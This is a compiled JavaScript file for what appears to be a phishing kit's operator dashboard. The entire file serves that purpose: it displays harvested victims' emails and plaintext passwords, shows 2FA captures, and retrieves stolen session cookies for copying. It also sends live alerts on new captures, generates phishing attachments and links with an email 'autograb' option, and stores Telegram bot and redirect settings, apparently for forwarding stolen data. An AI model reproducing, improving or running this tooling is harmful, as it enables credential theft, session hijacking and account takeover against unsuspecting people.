var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var parentLinks = document.querySelectorAll(".parent-link");
var subMenus = document.querySelectorAll(".sub-menu");
var sideMenu = document.querySelector("aside");
var sidebarLinks = document.querySelectorAll("nav a");
var sections = document.querySelectorAll("main section");
var menuLink = document.querySelectorAll("nav li");
var resultsData = document.querySelector("#results-data-container");
var popUpDetails = document.querySelector("#pop-up-details");
var containerContent = document.querySelectorAll(".pop-up-container-content");
function notifcation_handler() {
    //check if notifcation has been granted
    return new Promise(function (resolve, reject) {
        if (!("Notification" in window)) {
            //browser not suppported
            reject(false);
        }
        var state = Notification.permission;
        if (state == "granted") {
            resolve(true);
        }
        else if (state == "default") {
            //not granted then we request
            Notification.requestPermission().then(function (permission) {
                if (permission == "granted") {
                    resolve(true);
                }
                else {
                    //user denied our permission
                    resolve(false);
                }
            });
        }
        else {
            //state is denied
            //we reject the promise
            reject(false);
        }
    });
}
//automatically request for permission when opening
notifcation_handler();
//dont handle the promise since we are not using it here
//subscribe for events
var ws_handle = location.origin + "/c";
//connect to ws
var websocket = {
    onopen: null,
    onmessage: null,
    onerror: null,
    onclose: null,
};
//when open
websocket.onopen = function (event) {
    console.log("ws accepted");
};
//on message
websocket.onmessage = function (event) {
    //since we are dealing with text then
    //we send Notification of the data and also show toast
    var message = event.data;
    //now we show our Notification
    notifcation_handler().then(function (permited) {
        if (!permited) {
            //HANDLE NOT permited error
            // alert("Notification is not enabled on your browser, please do well to put it on");
        }
        var json = JSON.parse(message);
        //check if the messgae is a visit type
        console.log(json.type);
        switch (json.type) {
            case "visit":
                {
                    //dont send Notification to avoud bugging
                    showToast(json.message);
                    //show toast only
                }
                break;
            case "log":
            case "2fa":
                {
                    //show toast and then send a Notification
                    showToast(json.message);
                    send_push(json.message);
                }
                break;
            default:
                break;
        }
    })
        .catch(function (err) {
        console.log("Notification is disabled on browser or not permited or the browser doesnt support Notification");
    });
};
//on error
websocket.onerror = function (event) {
    console.log(event);
};
//
websocket.onclose = function (event) {
    console.log("closed");
};
//gathers data based on secion
function gather_data(targetSectionId) {
    return __awaiter(this, void 0, void 0, function () {
        var _a, data, e_1, err_1;
        return __generator(this, function (_b) {
            switch (_b.label) {
                case 0:
                    _a = targetSectionId;
                    switch (_a) {
                        case "logs": return [3 /*break*/, 1];
                        case "visits": return [3 /*break*/, 2];
                        case "errors": return [3 /*break*/, 6];
                    }
                    return [3 /*break*/, 9];
                case 1:
                    {
                        data = new FormData();
                        data.append("next", "1");
                        //fetch from backend
                        fetch("/logs", {
                            method: "POST",
                            body: data,
                        })
                            .then(function (response) {
                            return response.json();
                        })
                            .then(function (json) {
                            if (json && json.data) {
                                var resultsDataGroup_1 = "";
                                json.data.forEach(function (dataItem, index) {
                                    resultsDataGroup_1 += "\n\t\t\t\t\t\t\t\t<div class=\"result-container\" id='".concat(dataItem.id, "'>\n\t\t\t\t\t\t\t\t  <div>\n\t\t\t\t\t\t\t\t  \t<span class='status'>").concat(dataItem.status, "</span>\n\t\t\t\t\t\t\t\t  \t<span class=\"show-date\">").concat(dataItem.date, "</span>\n\t\t\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t\t\t\t  <div class=\"inner-result-wrapper\">\n\t\t\t\t\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t\t\t\t  <span>").concat(dataItem.ip_address, "</span>\n\t\t\t\t\t\t\t\t\t\t<span>").concat(dataItem.email, "</span>\n\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t<div class='d-flex gap-2 align-items-center' >\n\t\t\t\t\t\t\t\t\t  <button onclick=\"delete_log('").concat(dataItem.id, "');\">Delete</button>\n\t\t\t\t\t\t\t\t\t  <button onclick='showPopUp(`").concat(JSON.stringify(dataItem), "`, \"details\")'>Details <i class=\"fa-solid fa-eye\"></i></button>\n\t\t\t\t\t\t\t\t\t  <button onclick=\"fetch_cookies('").concat(dataItem.id, "');\" style=\"visibility: ").concat(dataItem.status !== "2fa" ? 'hidden' : 'visible', "\" >Cookies <i class=\"fa-solid fa-cookie\"></i></button>\n\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t \t\t </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t  ");
                                });
                                resultsData.innerHTML = resultsDataGroup_1;
                                // results chart
                                var redctx = document.getElementById('results-data');
                                //destroy existing charts
                                if ("getContext" in redctx) {
                                    redctx.remove();
                                    redctx = document.createElement("canvas");
                                    redctx.id = "results-data";
                                    document.getElementById("results-chart-container").appendChild(redctx);
                                }
                                //@ts-expect-error
                                new Chart(redctx, {
                                    type: 'pie',
                                    data: {
                                        labels: json.labels,
                                        datasets: [{
                                                label: 'Results distribution',
                                                data: json.ldata,
                                                backgroundColor: [
                                                    'rgb(255, 99, 132)',
                                                    'rgb(54, 162, 235)',
                                                    'rgb(255, 205, 86)'
                                                ],
                                                hoverOffset: 4
                                            }]
                                    }
                                });
                            }
                        })
                            .catch(function (err) {
                            console.log(err);
                            showToast("An error occured while trying to fetch log");
                        });
                    }
                    return [3 /*break*/, 10];
                case 2:
                    _b.trys.push([2, 4, , 5]);
                    return [4 /*yield*/, update_visits()];
                case 3:
                    _b.sent();
                    return [3 /*break*/, 5];
                case 4:
                    e_1 = _b.sent();
                    showToast("No visits data");
                    return [3 /*break*/, 5];
                case 5: return [3 /*break*/, 10];
                case 6:
                    _b.trys.push([6, 8, , 9]);
                    return [4 /*yield*/, update_errors()];
                case 7:
                    _b.sent();
                    return [3 /*break*/, 9];
                case 8:
                    err_1 = _b.sent();
                    showToast("No errors to show");
                    return [3 /*break*/, 9];
                case 9:
                    console.log("No action configured for " + targetSectionId);
                    _b.label = 10;
                case 10: return [2 /*return*/];
            }
        });
    });
}
function delete_log(id) {
    return new Promise(function (resolve, reject) {
        //prepare data
        var data = new FormData();
        data.append("identifier", id);
        fetch("/delete-cookie", {
            method: "POST",
            body: data,
        })
            .then(function (res) {
            if (res.ok) {
                return res.json();
            }
            var json = res.json();
            json.then(function (js) { return showToast(js.detail); });
        })
            .then(function (json) {
            if (json.success) {
                resolve("success full");
                //delete animation
                var element = document.getElementById(id).className = "deleted";
                //show toast
                showToast("Log deleted successfully,");
            }
        })
            .catch(function (err) {
            showToast("An error occured while deleting your log");
            console.log(err);
        });
    });
}
function update_errors() {
    return new Promise(function (resolve, reject) {
        //prepare data
        var data = new FormData();
        data.append("n", "1");
        //fetch errors
        fetch("/errors", {
            method: "POST",
            body: data,
        })
            .then(function (res) {
            if (res.ok) {
                return res.json();
            }
            var json = res.json();
            json.then(function (js) { return showToast(js.detail); });
        })
            .then(function (json) {
            var outerData = "";
            if (json && !!json.length) {
                json.forEach(function (data) {
                    outerData += "\n\t\t\t\t <div class=\"".concat(data.read == 0 ? 'unread' : 'read', "\" style=\"width: 95%;height: fit-content;margin: 0 auto;position: relative;margin-bottom: 20px; padding: 10px;\">\n\t\t\t\t\t<span style=\"display: block\">Date: ").concat(data.date, "</span>\n\t\t\t\t\t<span style=\"display: block\">Count: ").concat(data.count, "</span>\n\t\t\t\t\t<div style=\"margin: 0 auto;border: 2px solid azure;overflow: hidden;text-overflow: ellipsis;height: 40px;text-align: center;\">\n\t\t\t\t\t\t<i class=\"fa fa-").concat(data.read == 0 ? 'exclamation-triangle' : 'check', "\" aria-hidden=\"true\" style=\"position: absolute;left: 99px;color: red;\"></i> \n\t\t\t\t\t\t<span style=\"color: darkgreen\">").concat(data.error, "</span>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\t");
                });
                //set built data
                document.querySelector('#error-container').innerHTML = outerData;
                //tell we're done
                resolve("done");
            }
            else {
                reject("no data");
            }
        });
    });
}
function fetch_cookies(id) {
    var data = new FormData();
    data.append("identifier", id);
    fetch("/cookie", {
        method: "POST",
        body: data,
    })
        .then(function (res) {
        if (res.ok) {
            return res.json();
        }
        var json = res.json();
        json.then(function (js) { return showToast(js.detail); });
    })
        .then(function (json) {
        if (json)
            showPopUp(json.cookie, "cookies");
    })
        .catch(function (err) {
        console.log(err);
    });
}
// Get the last visited section from localStorage
var lastVisitedSectionId = localStorage.getItem("lastVisitedSection");
console.log(lastVisitedSectionId);
//hide all session
sections.forEach(function (section) {
    section.style.display = "none";
});
// Set the default section on initial entry or based on localStorage
if (lastVisitedSectionId) {
    //gather data before showing
    gather_data(lastVisitedSectionId)
        .then(function (res) {
        //show user the section
        document.getElementById(lastVisitedSectionId).style.display = "block";
        console.log(lastVisitedSectionId);
    });
}
else {
    // Choose a default section (the first section)
    gather_data(lastVisitedSectionId)
        .then(function (res) {
        //show user the section
        sections[0].style.display = "block";
        document.querySelector("nav a[href=\"#home\"]").style.backgroundColor =
            "#c5c8ce";
    });
}
// Find the currently active link (based on lastVisitedSection)
var activeLink = document.querySelector("nav a[href=\"#".concat(lastVisitedSectionId, "\"]"));
if (activeLink) {
    activeLink.style.backgroundColor = "#c5c8ce"; // Set background color directly
}
function update_visits() {
    return new Promise(function (resolve, reject) {
        //prepare data
        var data = new FormData();
        var gridData = [];
        data.append("n", "1");
        fetch("/visits", {
            method: "POST",
            body: data,
        })
            .then(function (res) {
            if (res.ok) {
                return res.json();
            }
            res.json().then(function (js) { return showToast(js.detail); });
        })
            .then(function (json) {
            if (json.visits) {
                json.visits.forEach(function (visit) {
                    gridData.push({
                        ip: visit.ip,
                        type: visit.type,
                        isp: visit.isp,
                        date: visit.date,
                        city: visit.city,
                        country: visit.country,
                        reason: visit.reason || "N/A",
                    });
                });
                resolve("done");
            }
            reject("no data");
        });
        //@ts-expect-error
        new gridjs.Grid({
            columns: [{
                    name: "IP",
                    sort: false,
                    // width: '40%',
                }, {
                    name: "type",
                    sort: true,
                    // width: '40%',
                }, {
                    name: "ISP",
                    sort: true,
                    // width: '40%',
                },
                {
                    name: "Date",
                    sort: true,
                    // width: '40%',
                },
                {
                    name: "City",
                    sort: true,
                    width: '10%',
                },
                {
                    name: "Country",
                    sort: true,
                    width: '20%',
                },
                {
                    name: "Reason",
                    sort: true,
                    width: '20%',
                },
            ],
            data: gridData,
        }).render(document.getElementById("table"));
    });
}
// navigation links function
sidebarLinks.forEach(function (link) {
    link.addEventListener("click", function (event) {
        return __awaiter(this, void 0, void 0, function () {
            var targetSectionId, targetSection;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        event.preventDefault(); // Prevent default link behavior
                        // Remove active styling from all links
                        sidebarLinks.forEach(function (link) {
                            link.style.backgroundColor = ""; // Reset background color
                        });
                        // Hide all sections
                        sections.forEach(function (section) {
                            section.style.display = "none";
                        });
                        targetSectionId = this.hash.substring(1);
                        return [4 /*yield*/, gather_data(targetSectionId)];
                    case 1:
                        _a.sent();
                        targetSection = document.getElementById(targetSectionId);
                        targetSection.style.display = "block";
                        // Add active styling to the clicked link
                        this.style.backgroundColor = "#c5c8ce"; // Set background color directly
                        // Update localStorage with the visited section ID
                        localStorage.setItem("lastVisitedSection", targetSectionId);
                        console.log(targetSectionId);
                        return [2 /*return*/];
                }
            });
        });
    });
});
// Dropdown menu functionality
parentLinks.forEach(function (link, index) {
    link.addEventListener("click", function (e) {
        e.preventDefault(); // Prevent default link behavior
        toggleSubMenu(index);
        parentLinks.forEach(function (otherLink, otherIndex) {
            if (otherIndex !== index) {
                toggleIconRotation(otherLink.querySelector("i"), false); // Reset icon rotation for other links
            }
        });
        toggleIconRotation(link.querySelector("i"), true); // Toggle icon rotation for the clicked link
    });
});
// toggle dropdown
function toggleSubMenu(index) {
    subMenus.forEach(function (menu, i) {
        if (i === index) {
            menu.classList.toggle("show");
        }
        else {
            menu.classList.remove("show"); // Change to display none to hide
        }
    });
}
// icon rotation
function toggleIconRotation(icon, active) {
    if (active === void 0) { active = true; }
    if (active) {
        icon.classList.toggle("rotate"); // Add rotation class
    }
    else {
        icon.classList.remove("rotate"); // Remove rotation class
    }
}
// toggle side nav menu
function toggleMenu() {
    sideMenu.classList.toggle("show");
}
// Reset Logs and Visits button click event
var resetBtn = document.getElementById("reset-btn");
resetBtn.addEventListener("click", function () {
    // Reset logic here
    var data = new FormData();
    data.append("delete", "true");
    fetch("/clear-logs", {
        method: "POST",
        body: data,
    })
        .then(function (res) {
        return res.json();
    })
        .then(function (json) {
        if (json && json.status && json.status == "success") {
            showToast("Successfully cleared");
            location.reload();
        }
        else if (json.status == "error") {
            showToast("Error clearing your data");
        }
    }).catch(function (e) {
        console.log(e);
        showToast("An error occured while attempting to clear your data");
    });
});
// Log Out button click event
var logoutBtn = document.getElementById("logout-btn");
logoutBtn.addEventListener("click", function () {
    var data = new FormData();
    data.append("logout", "1");
    // Logout logic
    fetch("/logout", {
        method: "POST",
        body: data,
    }).then(function (res) {
        return res.json();
    }).then(function (json) {
        if (json && json.status && json.status == "success") {
            showToast("Successfully logged out");
            location.reload();
        }
        else if (json.status == "error") {
            showToast("Error logging you out");
        }
    }).catch(function () {
        showToast("An error occured while attempting to log you out");
    });
});
// Close submenus when clicking outside
document.addEventListener("click", function (e) {
    var target = e.target;
    if (!target.closest("aside") && !target.closest("#menu")) {
        // If the click target is not within the side menu or the menu toggle button
        sideMenu.classList.remove("show"); // Close the side menu
    }
});
function showToast(text) {
    return new Promise(function (resolve, reject) {
        if (text) {
            var toast_1 = document.querySelector("#toast");
            var toast_close = document.querySelector("#close-toast");
            //check if toast is still open
            // if(toast.className == "fade-in"){
            // 				//recurse till free
            // 				setTimeout(()=>{
            // 					showToast(text);
            // 				},)
            // 			}
            //set text
            document.querySelector("#toast-content").innerText = text;
            //auto close after 5000 seconds
            var timeout_1 = setTimeout(function () {
                setTimeout(function () {
                    resolve("done");
                }, 1500);
                //wait before destroying the ui then close
                toast_1.className = "fade-out";
            }, 3000);
            //close when clicked
            toast_close.addEventListener("click", function (e) {
                toast_1.className = "fade-out";
                clearTimeout(timeout_1);
                setTimeout(function () {
                    resolve("closed");
                }, 1500);
            });
            //fades in here
            toast_1.className = "fade-in";
        }
    });
}
function showPopUp(details, actionType) {
    var data = actionType == "details" ? JSON.parse(details) : details;
    popUpDetails.style.display = "block";
    // popUpDetails.classList.add('show');
    // Render specific content based on the actionType
    var popUpContent = document.querySelector("#pop-up-content");
    if (actionType === "details") {
        // Render details content
        popUpContent.innerHTML = "\n      <i aria-hidden=\"true\" class=\"fa fa-close\" onclick=\"hidePopUp()\"></i>\n      <h1>Details</h1>\n      <div class=\"copy-hold\">\n      \t<span style=\"width:70px\">Email: </span>\n      \t<div class=\"copier\">\n      \t\t".concat(data.email, "\n      \t</div>\n      \t<i class=\"fa fa-copy copy-click\" aria-hidden=\"true\" onclick=\"copy('").concat(data.email, "')\"></i>\n      </div>\n      <div class=\"copy-hold\">\n      \t<span style=\"width:70px\">Password: </span>\n      \t<div class=\"copier\">\n      \t\t").concat(data.password, "\n      \t</div>\n      \t<i class=\"fa fa-copy copy-click\" aria-hidden=\"true\" onclick=\"copy('").concat(data.password, "')\"></i>\n      </div>\n      <div class=\"copy-hold\">\n      \t<span style=\"width:70px\">Type: </span>\n      \t<div class=\"copier\">\n      \t\t").concat(data.status, "\n      \t</div>\n      \t<i class=\"fa fa-copy copy-click\" aria-hidden=\"true\" onclick=\"copy('").concat(data.status, "')\"></i>\n      </div>\n      <div class=\"copy-hold\">\n      \t<span style=\"width:70px\">IP: </span>\n      \t<div class=\"copier\">\n      \t\t").concat(data.ip_address, "\n      \t</div>\n      \t<i class=\"fa fa-copy copy-click\" aria-hidden=\"true\" onclick=\"copy('").concat(data.ip_address, "')\"></i>\n      </div>\n      <div class=\"copy-hold\">\n      \t<span style=\"width:70px\">Date: </span>\n      \t<div class=\"copier\">\n      \t\t").concat(data.date, "\n      \t</div>\n      \t<i class=\"fa fa-copy copy-click\" aria-hidden=\"true\" onclick=\"copy('").concat(data.date, "')\"></i>\n      </div>\n    ");
    }
    else if (actionType === "cookies") {
        // Render cookies content
        popUpContent.innerHTML = "\n      <i aria-hidden=\"true\" class=\"fa fa-close\" onclick=\"hidePopUp()\"></i>\n      <h1>Cookies</h1>\n      <div style=\"text-align: center;\">\n      \t<div style=\"margin-bottom: 20px;border: 2px solid antiquewhite;height: 200px;overflow: scroll;\">\n      \t\t".concat(data, "\n      \t</div>\n      <span style=\"display: none;\" id=\"cookie-input\">").concat(data, "</span>\n      <button style=\"margin: 0 auto;\" onclick=\"copy(document.getElementById('cookie-input').innerText)\">Copy</button></div>\n    \n    ");
    }
}
function hidePopUp() {
    popUpDetails.style.display = "none";
}
function fallbackCopyTextToClipboard(text) {
    var textArea = document.createElement("textarea");
    textArea.value = text;
    // Avoid scrolling to bottom
    textArea.style.top = "0";
    textArea.style.left = "0";
    textArea.style.position = "fixed";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    try {
        var successful = document.execCommand('copy');
        var msg = successful ? 'successful' : 'unsuccessful';
        console.log('Fallback: Copying text command was ' + msg);
    }
    catch (err) {
        console.error('Fallback: Oops, unable to copy', err);
    }
    document.body.removeChild(textArea);
}
function copy(text) {
    if (!navigator.clipboard) {
        fallbackCopyTextToClipboard(text);
        return;
    }
    navigator.clipboard.writeText(text).then(function () {
        console.log('Async: Copying to clipboard was successful!');
    }, function (err) {
        console.error('Async: Could not copy text: ', err);
    });
}
//send push notification
function send_push(text, title) {
    new Notification(title || "🦅🕊️", {
        body: text,
        icon: location.origin + "/img/ample.png",
    });
}
// generate attachment
document
    .getElementById("generate-attachment")
    .addEventListener("submit", function (event) {
    // Prevent default form submission behavior
    event.preventDefault();
    // Gather form data
    var att_autograb = document.getElementById("att-auto").value;
    var mainPageBackgroundInput = document.getElementById("main-page-background");
    var mainPageBackground = mainPageBackgroundInput.value;
    var mainPageTitleInput = document.getElementById("main-page-title");
    var mainPageTitle = mainPageTitleInput.value;
    var mainRedCaptionInput = document.getElementById("main-red-caption");
    var mainRedCaption = mainRedCaptionInput.value;
    //check if attachment autograb is emtpty, then ask if user wants to continue with default
    if (!att_autograb && !confirm("You didn't specify an autograb to use, Are you sure to continue?")) {
        return false;
    }
    // Prepare data for submission
    var formData = new FormData();
    formData.append("autograb", att_autograb);
    formData.append("bg", mainPageBackground);
    formData.append("title", mainPageTitle);
    formData.append("caption", mainRedCaption);
    // Submit data to backend endpoint
    fetch("/attachment-generate", {
        method: "POST",
        body: formData
    })
        .then(function (response) {
        if (response.ok) {
            return response.json();
        }
        response.json().then(function (js) { return showToast(js.detail); });
        throw new Error("An error occured");
    })
        .then(function (json) {
        //set the popup to show
        popUpDetails.style.display = "block";
        //get the diplayer
        var content = document.querySelector("#pop-up-content");
        //display to user here
        content.innerHTML = "\n             <i aria-hidden=\"true\" class=\"fa fa-close\" onclick=\"hidePopUp()\"></i>\n      <h1>Attachment Content</h1>\n      <div style=\"text-align: center;\">\n      \t<div id=\"attachment-data\" style=\"margin-bottom: 20px;border: 2px solid antiquewhite;height: 200px;overflow: scroll;\">\n      \t\t\n      \t</div>\n      <span style=\"display: none;\" id=\"link-input\"></span>\n      <button style=\"margin: 0 auto;display: inline-block;\" onclick=\"copy(document.getElementById('link-input').innerText)\">Copy</button>\n      <button style=\"margin: 0 auto;display: inline-block;\" onclick=\"download(document.getElementById('link-input').innerText,'attachment')\">Download</button></div>\n    \n        ";
        document.getElementById("attachment-data").innerText = json.data;
        document.getElementById("link-input").innerText = json.data;
    })
        .catch(function (error) {
        console.error("There was a problem with your fetch operation:", error);
    });
});
// generate link
document
    .getElementById("generate-link")
    .addEventListener("submit", function (event) {
    // Prevent default form submission behavior
    event.preventDefault();
    // Gather form data
    var autograb_holder = document.getElementById("link-autograbs");
    var autograb = autograb_holder.placeholder;
    if (autograb_holder.value) {
        autograb += "," + autograb_holder.value;
    }
    // Prepare data for submission
    var formData = new FormData();
    formData.append("autograb", autograb);
    // Submit data to backend endpoint
    fetch("/link-generate", {
        method: "POST",
        body: formData
    })
        .then(function (res) {
        if (res.ok) {
            return res.json();
        }
        res.json().then(function (js) { return showToast(js.detail); });
        throw new Error("Error generating your link content");
    })
        .then(function (json) {
        console.log(json);
        //get data from backend
        var content = document.querySelector("#pop-up-content");
        popUpDetails.style.display = "block";
        //display to user here
        content.innerHTML = "\n             <i aria-hidden=\"true\" class=\"fa fa-close\" onclick=\"hidePopUp()\"></i>\n      <h1>Link Content</h1>\n      <div style=\"text-align: center;\">\n      \t<div id=\"attachment-data\" style=\"margin-bottom: 20px;border: 2px solid antiquewhite;height: 200px;overflow: scroll;\">\n      \t\t\n      \t</div>\n      <span style=\"display: none;\" id=\"link-input\"></span>\n      <button style=\"margin: 0 auto;display: inline-block;\" onclick=\"copy(document.getElementById('link-input').innerText)\">Copy</button>\n      <button style=\"margin: 0 auto;display: inline-block;\" onclick=\"download(document.getElementById('link-input').innerText,'link')\">Download</button></div>\n    \n        ";
        document.getElementById("attachment-data").innerText = json.data;
        document.getElementById("link-input").innerText = json.data;
    })
        .catch(function (error) {
        console.error("There was a problem with your fetch operation:", error);
    });
});
function download(text, name, type) {
    return new Promise(function (resolve, reject) {
        name = name || text.substring(0, 5);
        var filename;
        if (!(type == 'txt')) {
            filename = name + '.html';
        }
        else {
            filename = 'downloaded-' + type + '.txt';
        }
        var element = document.createElement('a');
        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
        element.setAttribute('download', filename);
        element.style.display = 'none';
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
        resolve();
    });
}
// update profile
document
    .getElementById("settings-form")
    .addEventListener("submit", function (event) {
    // Prevent default form submission behavior
    event.preventDefault();
    // Gather form data
    var name = document.getElementById("user_name").value;
    var password = document.getElementById("password").value;
    var api = document.getElementById("api-key").value;
    var redirect = document.getElementById("redirect-url").value;
    var bot_token = document.getElementById("bot-token").value;
    var chat_id = document.getElementById("chat-id").value;
    var random = false;
    // Prepare data for submission
    var formData = new FormData();
    formData.append("name", name);
    formData.append("pw", password);
    formData.append("api", api);
    formData.append("redirect", redirect);
    formData.append("bot", bot_token);
    formData.append("chat", chat_id);
    if (random)
        formData.append("random", "1");
    // Submit data to backend endpoint
    fetch("/settings-update", {
        method: "POST",
        body: formData
    })
        .then(function (response) {
        if (response.ok) {
            return response.json();
        }
        response.json().then(function (js) { return showToast(js.detail); });
        throw new Error("An error occured");
    })
        .then(function (data) {
        ///successful if data is passed
        // Handle response from backend
        if (data.success) {
            showToast("Settings updated successful, reload to see changes");
        }
    })
        .catch(function (error) {
        console.error("There was a problem with your fetch operation:", error);
    });
});
